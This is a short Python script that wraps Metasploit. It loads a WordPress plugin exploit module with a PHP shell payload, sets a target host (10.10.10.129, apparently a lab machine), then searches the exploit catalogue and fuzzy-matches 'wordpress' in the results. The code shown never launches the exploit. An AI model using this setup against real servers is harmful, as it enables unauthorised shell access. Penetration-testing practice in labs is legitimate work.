from msfbase import msfmodule
from exploit_base import save_module
from fuzz import fuzzyfinder

wordpress =  msfmodule()
wordpress.load('wordpress','unix/webapp/wordpress_zabbix_plugin_new','php/shell_php')
wordpress.set_target("10.10.10.129","/wordpress")
wordpress.cre_console()
option = wordpress.cmd('help search')
print(option['data'])
option = wordpress.cmd('search type:exploit')
print(option['data'])
msf_file = option['data'].encode('utf-8')
with open(r"/root/桌面/search.txt","wb") as f:
    f.write(msf_file)
datas = save_module("/root/桌面/search.txt")

find = fuzzyfinder('wordpress',datas)
print(find)

